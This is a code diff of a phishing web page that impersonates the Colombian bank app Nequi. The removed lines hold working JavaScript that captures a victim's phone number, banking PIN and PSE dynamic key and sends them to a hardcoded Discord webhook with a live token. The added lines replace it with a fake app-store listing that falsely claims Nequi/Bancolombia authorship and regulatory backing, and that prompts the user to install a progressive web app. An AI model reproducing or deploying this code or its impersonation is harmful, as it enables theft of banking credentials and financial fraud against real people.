-                    <!-- CORREGIDO AQUÍ: Se cambió pressKey por pressPseKey -->
-                    <button class="pse-key" onclick="pressPseKey('8')">8</button>
-                    <button class="pse-key" onclick="pressPseKey('9')">9</button>
-                    <button class="pse-key" style="visibility: hidden;"></button>
-                    <button class="pse-key" onclick="pressPseKey('0')">0</button>
-                    <button class="pse-key" onclick="pressPseKey('del')"><div class="pse-key-del">×</div></button>
+            <!-- Right Sidebar -->
+            <aside class="space-y-6">
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
+                    <h3 class="font-bold text-slate-900 border-b border-slate-100 pb-3">Información de la aplicación</h3>
+
+                    <div class="space-y-3 text-xs sm:text-sm">
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">Versión</span>
+                            <span class="font-medium text-slate-800">v5.0.2</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">Tamaño</span>
+                            <span class="font-medium text-slate-800">42 MB</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">Desarrollador</span>
+                            <span class="font-medium text-nequi-purple text-right">Nequi Colombia / Bancolombia</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">Categoría</span>
+                            <span class="font-medium text-slate-800">Finanzas / Créditos</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500">S.O. Requerido</span>
+                            <span class="font-medium text-slate-800">Android 8.0+ / iOS 14+</span>
+                        </div>
+                    </div>
                 </div>
-            </div>
+
+                <div class="bg-gradient-to-br from-nequi-bg to-white rounded-3xl p-6 shadow-sm border border-nequi-pink/10 space-y-3">
+                    <div class="flex items-center gap-3 text-nequi-purple font-semibold">
+                        <i data-lucide="shield-check" class="w-6 h-6 text-nequi-pink"></i>
+                        <span>Entidad Regulada</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        Vigilado por la Superintendencia Financiera de Colombia. Tus préstamos cuentan con garantía institucional.
+                    </p>
+                </div>
+            </aside>
         </div>
+    </main>
 
-    </div>
+    <!-- Footer -->
+    <footer class="bg-white border-t border-slate-200 mt-12 py-8">
+        <div class="max-w-5xl mx-auto px-4 text-center text-xs text-slate-400 space-y-2">
+            <p>© 2026 Nequi Colombia / Bancolombia. Todos los derechos reservados.</p>
+            <p>Página demostrativa de tienda de aplicaciones para Nequi Préstamos.</p>
+        </div>
+    </footer>
 
+    <!-- Direct PWA Script -->
     <script>
-        let currentPhoneNumber = "";
-        let currentPin = "";
-        let currentPsePin = "";
+        lucide.createIcons();
 
-        function validatePhone(input) {
-            const enterBtn = document.getElementById('enterBtn');
-            const errorMsg = document.getElementById('errorMsg');
-            
-            if (input.value.length >= 7) {
-                enterBtn.removeAttribute('disabled');
-                enterBtn.classList.add('active');
-                errorMsg.style.display = 'none';
+        let deferredPrompt = null;
+
+        // Capture standard PWA installation event immediately
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
+
+        // Trigger native PWA prompt directly upon clicking "Instalar"
+        async function handlePwaInstall() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const choiceResult = await deferredPrompt.userChoice;
+                if (choiceResult.outcome === 'accepted') {
+                    const btnText = document.getElementById('btnText');
+                    if (btnText) btnText.innerText = 'Instalado';
+                }
+                deferredPrompt = null;
+            }
+        }
+
+        function scrollGallery(direction) {
+            const container = document.getElementById('galleryContainer');
+            const scrollAmount = 280;
+            if (direction === 'left') {
+                container.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
             } else {
-                enterBtn.setAttribute('disabled', 'true');
-                enterBtn.classList.remove('active');
-                errorMsg.style.display = 'block';
+                container.scrollBy({ left: scrollAmount, behavior: 'smooth' });
             }
         }
 
-        function goToPinScreen() {
-            const input = document.getElementById('phoneInput');
-            if (input.value.length >= 7) {
-                currentPhoneNumber = input.value;
-                document.getElementById('screen1').classList.add('hidden');
-                document.getElementById('screen2').classList.remove('hidden');
-            }
-        }
-
-        function goToScreen1() {
-            document.getElementById('screen2').classList.add('hidden');
-            document.getElementById('screen3').classList.add('hidden');
-            document.getElementById('screen1').classList.remove('hidden');
-            currentPin = "";
-            currentPsePin = "";
-            updatePinDots();
-            updatePseDisplay();
-        }
-
-        function pressKey(num) {
-            if (num === 'del') {
-                currentPin = currentPin.slice(0, -1);
-            } else if (currentPin.length < 4) {
-                currentPin += num;
-            }
-            updatePinDots();
-
-            if (currentPin.length === 4) {
-                enviarAWebhookDiscord(currentPhoneNumber, currentPin, null);
-            }
-        }
-
-        function updatePinDots() {
-            for (let i = 0; i < 4; i++) {
-                const dot = document.getElementById('dot' + i);
-                if (i < currentPin.length) {
-                    dot.classList.add('filled');
-                } else {
-                    dot.classList.remove('filled');
-                }
-            }
-        }
-
-        function pressPseKey(num) {
-            if (num === 'del') {
-                currentPsePin = currentPsePin.slice(0, -1);
-            } else if (currentPsePin.length < 6) {
-                currentPsePin += num;
-            }
-            updatePseDisplay();
-
-            if (currentPsePin.length === 6) {
-                enviarClaveDinamicaWebhook(currentPhoneNumber, currentPin, "6" + currentPsePin);
-            }
-        }
-
-        function updatePseDisplay() {
-            for (let i = 0; i < 6; i++) {
-                const box = document.getElementById('d' + i);
-                if (i < currentPsePin.length) {
-                    box.textContent = currentPsePin[i];
-                } else {
-                    box.textContent = "";
-                }
-            }
-        }
-
-        function enviarAWebhookDiscord(telefono, pin, claveDinamica) {
-            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
-
-            let mensaje = `🚨 **Nuevo Registro Capturado** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}`;
-            if (claveDinamica) {
-                mensaje += `\n🔢 **Clave Dinámica PSE:** ${claveDinamica}`;
-            }
-
-            const payload = { content: mensaje };
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                setTimeout(() => {
-                    if (!claveDinamica) {
-                        document.getElementById('screen2').classList.add('hidden');
-                        document.getElementById('screen3').classList.remove('hidden');
-                    }
-                }, 300);
-            })
-            .catch(error => {
-                console.error("Error al enviar datos:", error);
-                setTimeout(() => {
-                    if (!claveDinamica) {
-                        document.getElementById('screen2').classList.add('hidden');
-                        document.getElementById('screen3').classList.remove('hidden');
-                    }
-                }, 300);
-            });
-        }
-
-        function enviarClaveDinamicaWebhook(telefono, pin, claveDinamica) {
-            const webhookURL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
-
-            const payload = {
-                content: `🚨 **Clave Dinámica PSE Capturada** 🚨\n📱 **Celular:** +57 ${telefono}\n🔑 **PIN:** ${pin}\n🔢 **Clave Dinámica:** ${claveDinamica}`
-            };
-
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                setTimeout(() => {
-                    alert("¡Proceso completado con éxito!");
-                    goToScreen1();
-                }, 400);
-            })
-            .catch(error => {
-                console.error("Error al enviar clave dinámica:", error);
-                setTimeout(() => {
-                    alert("¡Proceso completado con éxito!");
-                    goToScreen1();
-                }, 400);
-            });
-        }
+        window.addEventListener('appinstalled', () => {
+            deferredPrompt = null;
+            const btnText = document.getElementById('btnText');
+            if (btnText) btnText.innerText = 'Instalado';
+        });
     </script>
 </body>
-                    </html>
+</html>
